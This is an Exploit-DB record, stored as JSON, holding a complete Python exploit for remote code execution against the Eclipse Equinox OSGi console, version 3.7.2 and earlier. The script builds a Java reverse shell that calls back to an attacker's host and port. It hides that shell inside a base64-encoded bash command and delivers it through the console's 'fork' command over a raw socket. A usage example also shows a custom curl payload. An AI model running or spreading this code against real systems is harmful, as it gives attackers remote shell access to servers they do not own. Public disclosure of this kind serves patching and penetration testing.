{"source": "https://www.exploit-db.com/exploits/51879", "vulnName": "OSGi v3.7.2 (and below) Console - RCE", "vulnEDBID": "51879", "vulnCVE": "N/A", "author": "ANDRZEJ OLCHAWA, MILENKO STARCIK", "exploitType": "WEBAPPS", "platform": "MULTIPLE", "datePublished": "2024-03-12", "vulnContent": "#!/usr/bin/python\n\n# Exploit Title: [OSGi v3.7.2 Console RCE]\n# Date: [2023-07-28]\n# Exploit Author: [Andrzej Olchawa, Milenko Starcik,\n#                  VisionSpace Technologies GmbH]\n# Exploit Repository:\n#           [https://github.com/visionspacetec/offsec-osgi-exploits.git]\n# Vendor Homepage: [https://eclipse.dev/equinox]\n# Software Link: [https://archive.eclipse.org/equinox/]\n# Version: [3.7.2 and before]\n# Tested on: [Linux kali 6.3.0-kali1-amd64]\n# License: [MIT]\n#\n# Usage:\n# python exploit.py --help\n#\n# Examples:\n# python exploit.py --rhost=localhost --rport=1337 --lhost=localhost \\\n#   --lport=4444\n#\n# python exploit.py --rhost=localhost --rport=1337 --payload= \\\n#   \"curl http://192.168.100.100/osgi_test\"\n\n\n\"\"\"\nThis is an exploit that allows to open a reverse shell connection from\nthe system running OSGi v3.7.2 and earlier.\n\"\"\"\nimport argparse\nimport base64\nimport socket\n\n\ndef parse():\n    \"\"\"\n    This fnction is used to parse and return command-line arguments.\n    \"\"\"\n\n    parser = argparse.ArgumentParser(\n        prog=\"OSGi-3.7.2-console-RCE\",\n        description=\"This tool will let you open a reverse shell from the \"\n                    \"system that is running OSGi with the '-console' \"\n                    \"option in version 3.7.2 (or before).\",\n        epilog=\"Happy Hacking! :)\",\n    )\n\n    parser.add_argument(\"--rhost\", dest=\"rhost\",\n                        help=\"remote host\", type=str, required=True)\n    parser.add_argument(\"--rport\", dest=\"rport\",\n                        help=\"remote port\", type=int, required=True)\n    parser.add_argument(\"--lhost\", dest=\"lhost\",\n                        help=\"local host\", type=str, required=False)\n    parser.add_argument(\"--lport\", dest=\"lport\",\n                        help=\"local port\", type=int, required=False)\n    parser.add_argument(\"--payload\", dest=\"custom_payload\",\n                        help=\"custom payload\", type=str, required=False)\n    parser.add_argument(\"--version\", action=\"version\",\n                        version=\"%(prog)s 0.1.0\")\n\n    args = parser.parse_args()\n\n    if args.custom_payload and (args.lhost or args.lport):\n        parser.error(\n            \"either --payload or both --lport and --rport are required.\")\n\n    return args\n\n\ndef generate_payload(lhost, lport, custom_payload):\n    \"\"\"\n    This function generates the whole payload ready for the delivery.\n    \"\"\"\n\n    payload = \"\"\n\n    if custom_payload:\n        payload = custom_payload\n\n        print(\"(*) Using custom payload.\")\n    elif lhost and lport:\n        payload = \\\n            \"echo 'import java.io.IOException;import java.io.InputStream;\" \\\n            \"import java.io.OutputStream;import java.net.Socket;class Rev\" \\\n            \"Shell {public static void main(String[] args) throws Excepti\" \\\n            \"on { String host=\\\"%s\\\";int port=%s;String cmd=\\\"sh\\\";Proces\" \\\n            \"s p=new ProcessBuilder(cmd).redirectErrorStream(true).start(\" \\\n            \");Socket s=new Socket(host,port);InputStream pi=p.getInputSt\" \\\n            \"ream(),pe=p.getErrorStream(), si=s.getInputStream();OutputSt\" \\\n            \"ream po=p.getOutputStream(), so=s.getOutputStream();while(!s\" \\\n            \".isClosed()){while(pi.available()>0)so.write(pi.read());whil\" \\\n            \"e(pe.available()>0)so.write(pe.read());while(si.available()>\" \\\n            \"0)po.write(si.read());so.flush();po.flush();Thread.sleep(50)\" \\\n            \";try {p.exitValue();break;}catch (Exception e){}};p.destroy(\" \\\n            \");s.close();}}' > RevShell.java ; java ./RevShell.java\" % (\n                lhost, lport)\n\n        print(\"(+) Using Java reverse shell payload.\")\n\n    bash_payload = b\"bash -c {echo,%s}|{base64,-d}|{bash,-i}\" % (\n        base64.b64encode(payload.encode()))\n\n    wrapped_payload = b\"fork \\\"%s\\\"\\n\" % (bash_payload)\n\n    return wrapped_payload\n\n\ndef deliver_payload(rhost, rport, payload):\n    \"\"\"\n    This function connects to the target host and delivers the payload.\n    It returns True if successful; False otherwise.\n    \"\"\"\n\n    print(\"(*) Sending payload...\")\n\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((rhost, rport))\n        sock.send(payload)\n        sock.close()\n    except socket.error as err:\n        print(f\"(-) Could not deliver the payload to {rhost}:{rport}!\")\n        print(err)\n        return False\n\n    return True\n\n\ndef main(args):\n    \"\"\"\n    Main function.\n    \"\"\"\n\n    payload = generate_payload(args.lhost, args.lport, args.custom_payload)\n\n    success = deliver_payload(args.rhost, args.rport, payload)\n    if success:\n        print(\"(+) Done.\")\n    else:\n        print(\"(-) Finished with errors.\")\n\n\nif __name__ == \"__main__\":\n    main(parse())\n            "}